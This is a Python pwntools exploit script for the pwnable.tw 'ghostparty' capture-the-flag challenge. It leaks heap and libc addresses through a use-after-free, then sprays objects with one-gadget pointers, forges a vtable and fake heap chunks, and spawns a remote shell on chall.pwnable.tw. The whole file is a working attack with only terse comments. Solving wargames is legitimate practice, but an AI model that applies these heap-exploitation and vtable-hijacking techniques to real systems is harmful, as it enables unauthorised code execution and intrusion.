#!/usr/bin/env python3

from pwn import *

exe = ELF("./ghostparty_patched",checksec=False)
libc = ELF("./libc_64.so.6",checksec=False)
ld = ELF("./ld-2.23.so",checksec=False)

context.binary = exe
def GDB():
    gdb.attach(p,gdbscript='''
    c
    ''')
    input()


if args.REMOTE:
    p=remote("chall.pwnable.tw",10401)
else:
    p = process([exe.path])
    GDB()


###########Ghost Type################
Werewolf = 1      
Devil  = 2    
Zombie = 3    
Skull  = 4    
Mummy  = 5       
Dullahan  = 6    
Vampire   = 7  
Yuki_onna  = 8 
Kasa_obake = 9
Alan = 10
######################################
ghostlist_offset = 0x2281b0
# heap leak = leak -0x12041
def addDevil(name,age,msg,type,power,joinparty):
    p.sendlineafter(b"Your choice :",b"1")
    p.sendlineafter(b"Name : ",name)
    p.sendlineafter(b"Age : ",f"{age}".encode())
    p.sendlineafter(b"Message : ",msg)
    p.sendlineafter(b"Choose a type of ghost :",f"{type}".encode())
    p.sendlineafter(b"Add power : ",power)
    p.sendlineafter(b"Your choice :",f"{joinparty}".encode())


def addVampire(name,age,msg,type,blood,joinparty):
    p.sendlineafter(b"Your choice :",b"1")
    p.sendlineafter(b"Name : ",name)
    p.sendlineafter(b"Age : ",f"{age}".encode())
    p.sendlineafter(b"Message : ",msg)
    p.sendlineafter(b"Choose a type of ghost :",f"{type}".encode())
    p.sendlineafter(b"Add blood :",blood)
    p.sendlineafter(b"Your choice :",f"{joinparty}".encode())
def removeGhost(index):
    p.sendlineafter(b"Your choice :",b"4")
    p.sendlineafter(b"from the party : ",f"{index}".encode())

def showghost(index):
    p.sendlineafter(b"Your choice :",b"2")
    p.sendlineafter(b"Choose a ghost which you want to show in the party :",f"{index}".encode())

Join    = 1   
Give_up = 2
Joinandhear = 3
addDevil(b"SUPERMAN",10,b"A"*8,Devil,b"FLY",Join) # this one use to leak heap
addDevil(b"BATMAN",11,b"A"*8,Devil,b"RICH",Join)

removeGhost(0)
addDevil(b"SUPERMAN",0,b"A"*8,Devil,b"A",Join)
showghost(1)
p.recvuntil(b"power : ")
leak = int.from_bytes(p.recvline()[:-1],"little")
log.info("[+]leak: "+hex(leak))
heap = leak - 0x12c41
log.info('[+]HEAP BASE: '+hex(heap))

addDevil(b"BATMAN",11,b"A"*8,Devil,b"B"*0xa0,Join)
addDevil(b"SUPERMAN",10,b"A"*8,Devil,b"A"*0x400,Join)
removeGhost(2)
addDevil(b"DENJI",11,b"A",Devil,b"A",Join)
showghost(3)
p.recvuntil(b"power : ")
leak1 = int.from_bytes(p.recvline()[:-1],"little")
log.info("[+]leak: "+hex(leak1))
libc.address = leak1 - 0x3c3b41
log.info('[+]LIBC BASE: '+hex(libc.address))
removeGhost(0)
removeGhost(0)
removeGhost(0)
removeGhost(0)
################
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf0567 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one =[0x45216,0x4526a,0xef6c4,0xf0567]
################
##### double free #############################################
victim = heap + 0x12d90
blood = flat(
    p64(libc.address+one[2])*12
)

addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)
addVampire(b"DENJI",10,b"DENJI",Vampire,blood,Join)


addVampire(b"POCHITA",11,b"MAKIMA",Vampire,b"0"*0x60,Joinandhear)
addVampire(b"POCHIT2",12,b"MAKIMA",Vampire,b"0"*0x60,Join)
removeGhost(11)
removeGhost(0)

''' our victim chunk
0x56211e377a50: 0x000056211e3778d0      0x303030300000000b
0x56211e377a60: 0x000056211e377ac0      0x000056211e377a78
0x56211e377a70: 0x0000000000000007      0x00657269706d6156
0x56211e377a80: 0x3030303030303030      0x000056211e377a98
0x56211e377a90: 0x0000000000000006      0x3000414d494b414d
0x56211e377aa0: 0x3030303030303030      0x000056211e377ae0
'''
vftable = heap + 0x13850
fake_chunks = flat(
  vftable,b"A"*8,
  heap+0x13ac0,heap+0x13a78,
  7,0x00657269706d6156,
  0x3030303030303030,heap+0x13a98,
  6,0x3000414d494b414d,
  0x3030303030303030,heap+0x13ae0,
)
addVampire(b"POCHIT3",11,b"MAKIMA",Vampire,b"A"*8,Join)
addVampire(b"POCHIT4",11,b"MAKIMA",Vampire,fake_chunks,Join)
# get shell
showghost(10) # POCHITA 2 is our one gagdget
p.sendline(b"cd home/ghostparty/")
p.sendline(b"ls")
p.interactive()

